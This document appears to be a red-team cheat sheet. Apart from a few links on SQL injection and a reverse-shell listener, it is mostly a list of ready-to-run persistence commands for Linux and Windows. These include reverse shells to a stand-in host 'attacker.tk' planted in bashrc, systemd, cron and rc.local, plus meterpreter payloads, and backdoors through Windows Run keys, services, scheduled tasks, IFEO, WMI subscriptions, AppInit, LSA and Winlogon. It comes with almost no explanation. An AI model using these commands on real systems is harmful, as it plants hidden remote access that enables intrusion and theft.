# WEB

## SQLi

### Cheatsheets

* [PostSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [Swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## XSS



## REVERSE
* rlwrap -cAr nc -lnvp PORT

# LATERAL

# PERSISTANT

## LINUX

* Autorun

    bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc

* Service

    bash#> vim /etc/systemd/system/persistence.service
    bash$> vim ~/.config/systemd/user/persistence.service

    [Unit]
    Description=persistence
    [Service]
    ExecStart=/bin/bash ‐c 'bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1'
    Restart=always
    RestartSec=60
    [Install]
    WantedBy=default.target

    bash#> systemctl enable persistence.service
    bash#> systemctl start persistence.service
    bash$> systemctl ‐‐user enable persistence.service
    bash$> systemctl ‐‐user start persistence.service

* Tasks

    bash#> echo "* * * * * bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1" >>/var/spool/cron/root
    bash#> echo $'SHELL=/bin/bash\n* * * * * root bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1\n'> /etc/cron.d/pwn

* In MEMORY

    msfvenom ‐p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888 ‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999
    bash$> inject_linux PID meter32.bin

* LD_PRELOAD

    bash#> echo /path/to/meter.so >> /etc/ld.so.preload
    bash#> echo export LD_PRELOAD=/path/to/meter.so >> /etc/profile
    bash$> echo export LD_PRELOAD=/path/to/meter.so >> ~/.bashrc

* rc.local

    bash#> echo "nc attacker.tk 8888 ‐e /bin/bash &" >> /etc/rc.local

## WINDOWS

* Autorun

    cmd$> copy meter.exe %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
    cmd$> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\users\username\meter.exe"
    cmd#> copy meter.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
    cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\system32\meter.exe"

* Service

    cmd#> sc create persistence binPath= "nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888" start= auto
    cmd#> sc failure persistence reset= 0 actions=restart/60000/restart/60000/restart/60000
    cmd#> sc start persistence

* Tasks

    cmd#> at 13:37 \temp\nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888
    cmd#> schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn persistence /tr "c:\temp\nc.exe ‐e c:\windows\system32\cmd.exe attacker.tk 8888"

* In MEMORY

    msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999
    cmd$> inject_windows.exe PID meter32.bin

* Debugger

    cmd#> copy calc.exe _calc.exe
    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe ‐e c:\windows\system32\cmd.exeattacker.tk 8888" /f

* Gflags

    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD/d 512
    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc ‐e \windows\system32\cmd.exe attacker.tk 8888"

* WMI

    cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilterCREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    cmd#> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"
    cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""

* AppInit

    cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
    cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f
    cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
    cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter32.dll" /f

* Lsass

    cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v"Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f

* Winlogon

    cmd#> reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\windows\meter.exe"

* Netsh

    cmd#> c:\windows\syswow64\netsh.exenetsh> add helper c:\windows\meter32.dll
    cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"

* Office

    cmd$> reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll

# LINKS

## MANUALS

* [Red Team Notes](https://dmcxblue.gitbook.io/red-team-notes-2-0/)
* [Hacktricks](https://book.hacktricks.xyz/)
* [Redteamrecipe](https://redteamrecipe.com/)
* [swisskey manul](https://swisskyrepo.github.io/InternalAllTheThings/)
* [Infosec sources](https://github.com/foorilla/allinfosecnews_sources)